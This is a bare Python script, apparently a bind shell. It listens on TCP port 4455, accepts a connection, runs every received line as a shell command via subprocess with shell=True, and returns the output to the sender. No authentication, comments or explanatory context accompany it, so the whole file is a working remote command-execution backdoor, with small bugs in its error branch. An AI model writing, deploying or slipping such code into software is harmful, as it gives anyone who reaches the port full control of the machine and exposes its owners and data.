import socket
import subprocess

HOST =''
Port = 4455
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, Port))
print("listing on {}".format(Port))
s.listen(5)

conn,addr = s.accept()
print("{} connected  to echo".format(addr[0]))

while True:
    data = conn.recv(1024)
    if data:
        data = data.decode()
        data = data.strip()
        print(">>" + data)
        p = subprocess.Popen(data, stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT)
        (out, err) = p.communicate()
        res = out.decode()
        data = "\n" + out.decode()
        conn.sendall((">"+ data).encode())


    else:
        conn.sendall("no data printed")



